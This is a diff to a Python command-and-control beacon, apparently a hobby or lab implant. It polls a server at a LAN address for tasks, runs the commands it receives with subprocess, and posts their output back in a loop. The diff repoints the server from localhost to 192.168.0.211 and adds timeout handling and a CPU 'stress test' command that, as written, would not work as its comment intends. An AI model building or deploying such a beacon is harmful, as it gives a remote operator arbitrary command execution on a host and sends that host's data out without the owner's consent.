@@ -1,10 +1,11 @@
 import time
 import requests
 import subprocess
+from datetime import datetime
 
 
 def fetch_next_task():
-    return requests.get('http://127.0.0.1:5000/next_task')
+    return requests.get("http://192.168.0.211:5000/next_task")
 
 
 def build_command(task):
@@ -26,7 +27,8 @@ def parse_output(output):
 
 
 def execute_task(task):
-    success = True
+    success = False
+    output = True
     command = []
     # Assume we have 4 task_types
     task_type = task["task_type"]
@@ -41,15 +43,25 @@ def execute_task(task):
         command = build_command(task)
     # Perform task
     print(f"command : {command}")
-    print("[!] Performing Task...")
-    process = subprocess.run(command, capture_output=True, timeout=30)
-    if process.returncode != 0:
-        print("[!] error")
-        # std error
-        success = False
-        output = parse_output(process.stderr)
-    else:
-        output = parse_output(process.stdout)
+    # If stress test don't output due to bug in subprocesses stopping timeout
+    if command == ["yes", ">", "/dev/null", "&"]:
+        output = False
+    start_time = round(datetime.timestamp(datetime.now()))
+    try:
+        process = subprocess.run(command, capture_output=output, timeout=15)
+        if process.returncode != 0:
+            print("[!] error")
+            # std error
+            output = parse_output(process.stderr)
+        else:
+            success = True
+            output = parse_output(process.stdout)
+    except subprocess.TimeoutExpired as e:
+        print(e)
+        output = e
+    end_time = round(datetime.timestamp(datetime.now()))
+    print(f"[!] Task Started @{start_time}")
+    print(f"[!] Task finished @{end_time}")
     task_result = {"output": output, "success": success}
     return task_result
 
@@ -58,7 +70,7 @@ def beacon_loop():
     print("Starting beacon loop")
     success = True
     while True:
-        time.sleep(10)
+        time.sleep(20)
         print("Looping")
         # 1. Fetch next task
         task = fetch_next_task()
@@ -76,7 +88,7 @@ def beacon_loop():
         else:
             contents = results["output"]
         # 4. POST results
-        result = requests.post('http://127.0.0.1:5000/results', json=[
+        result = requests.post("http://192.168.0.211:5000/results", json=[
             {
                 'task_id': json['task_id'], 'contents': contents, 'success': success
             }
